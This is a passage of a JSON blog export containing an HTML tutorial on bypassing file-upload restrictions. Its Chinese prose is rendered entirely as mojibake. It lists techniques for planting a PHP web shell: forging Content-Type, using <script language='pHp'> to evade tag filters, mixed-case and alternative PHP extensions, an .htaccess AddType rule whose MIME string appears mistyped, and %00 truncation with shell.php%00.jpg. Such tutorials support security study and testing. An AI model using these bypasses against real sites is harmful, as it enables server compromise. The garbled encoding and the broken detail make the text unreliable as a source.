çš„æ–‡ä»¶çš„æ‰©å±•åï¼Œå¯¹äºæ”»å‡»è€…æ¥è¯´æ˜¯æå…¶å®¹æ˜“ç»•è¿‡çš„ï¼Œå› æ­¤æ›´å¤šæ˜¯ç”¨äºé˜²æ­¢ç”¨æˆ·é”™è¯¯ä¸Šä¼ æ–‡ä»¶ç±»å‹çš„æªæ–½ã€‚</p>\n<h4 id=\"ç»•è¿‡\"><a href=\"#ç»•è¿‡\" class=\"headerlink\" title=\"ç»•è¿‡\"></a>ç»•è¿‡</h4><ol>\n<li>å…ˆä¸Šä¼ ä¸€ä¸ª.gifæˆ–è€….JPGä¹‹ç±»çš„æœ¨é©¬ï¼Œçªç ´å‰ç«¯éªŒè¯åå†é€šè¿‡æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€åæ¥å®ç°ç»•è¿‡</li>\n<li>é€šè¿‡ç¦ç”¨æˆ–è€…åˆ é™¤JSæ¥å®ç°çªç ´<h3 id=\"æœåŠ¡ç«¯éªŒè¯\"><a href=\"#æœåŠ¡ç«¯éªŒè¯\" class=\"headerlink\" title=\"æœåŠ¡ç«¯éªŒè¯\"></a>æœåŠ¡ç«¯éªŒè¯</h3><h4 id=\"MIMEç±»å‹æ£€æµ‹\"><a href=\"#MIMEç±»å‹æ£€æµ‹\" class=\"headerlink\" title=\"MIMEç±»å‹æ£€æµ‹\"></a>MIMEç±»å‹æ£€æµ‹</h4><h5 id=\"åŸç†-1\"><a href=\"#åŸç†-1\" class=\"headerlink\" title=\"åŸç†\"></a>åŸç†</h5>æœåŠ¡ç«¯é€šè¿‡æ£€æµ‹MIMEæ¥é™åˆ¶æ–‡ä»¶ä¸Šä¼ çš„ç±»å‹ï¼Œå…¶ä»£ç å¯èƒ½å¦‚ä¸‹ï¼š<br><code>$_FILES[&#39;flie&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;</code><h5 id=\"ç»•è¿‡-1\"><a href=\"#ç»•è¿‡-1\" class=\"headerlink\" title=\"ç»•è¿‡\"></a>ç»•è¿‡</h5>é€šè¿‡æŠ“åŒ…ä¿®æ”¹Content-Type<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.jpg\" alt=\"1.png\"><h4 id=\"æ£€æŸ¥æ–‡ä»¶å†…å®¹\"><a href=\"#æ£€æŸ¥æ–‡ä»¶å†…å®¹\" class=\"headerlink\" title=\"æ£€æŸ¥æ–‡ä»¶å†…å®¹\"></a>æ£€æŸ¥æ–‡ä»¶å†…å®¹</h4><h5 id=\"åŸç†-2\"><a href=\"#åŸç†-2\" class=\"headerlink\" title=\"åŸç†\"></a>åŸç†</h5>æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦åŒ…å«â€œ&lt;? â€ã€â€œ&lt;?= â€ä¹‹ç±»çš„å…³é”®å­—<h5 id=\"ç»•è¿‡-2\"><a href=\"#ç»•è¿‡-2\" class=\"headerlink\" title=\"ç»•è¿‡\"></a>ç»•è¿‡</h5>å¯ä»¥ä½¿ç”¨çŸ­tagç»•è¿‡ï¼Œä¾‹å¦‚<br><code>&lt;script language=&#39;pHp&#39;&gt;phpinfo();&lt;/script&gt;</code><h4 id=\"æ£€æŸ¥æ–‡ä»¶å\"><a href=\"#æ£€æŸ¥æ–‡ä»¶å\" class=\"headerlink\" title=\"æ£€æŸ¥æ–‡ä»¶å\"></a>æ£€æŸ¥æ–‡ä»¶å</h4><h5 id=\"åŸç†-3\"><a href=\"#åŸç†-3\" class=\"headerlink\" title=\"åŸç†\"></a>åŸç†</h5>æ£€æŸ¥æ–‡ä»¶åæ˜¯å¦åŒ…å«.php<h5 id=\"ç»•è¿‡-3\"><a href=\"#ç»•è¿‡-3\" class=\"headerlink\" title=\"ç»•è¿‡\"></a>ç»•è¿‡</h5></li>\n<li>å¤§å°å†™ç»•è¿‡ï¼Œå¦‚.PhP</li>\n<li>ä½¿ç”¨å…¶ä»–å¯èƒ½è¢«APacheè§£æçš„åç¼€ï¼Œå¦‚ï¼ˆ.php4/.php5/.php7/.pht/.phtmlï¼‰</li>\n<li>åœ¨Apacheç¯å¢ƒä¸‹ä¸Šä¼ .htaccessæ–‡ä»¶ä½¿å…¶å®ƒåç¼€ä¹Ÿè¢«è§£æä¸ºphpè„šæœ¬æ‰§è¡Œã€‚.htaccessæ–‡ä»¶å†…å®¹ä¸ºï¼š<br><code>AddType application/x-http-php .jpg </code></li>\n<li>%00æˆªæ–­ï¼Œæ“ä½œæ–¹æ³•ï¼šä¸Šä¼ shell.jpgï¼ŒBurpæŠ“åŒ…ï¼Œå°†æ–‡ä»¶åæ”¹ä¸ºshell.php%00.jpgï¼Œé€‰ä¸­%00ï¼Œè¿›è¡Œurl-decodeã€‚</li>\n</ol>\n",
            "tags": []
        }
    ]
}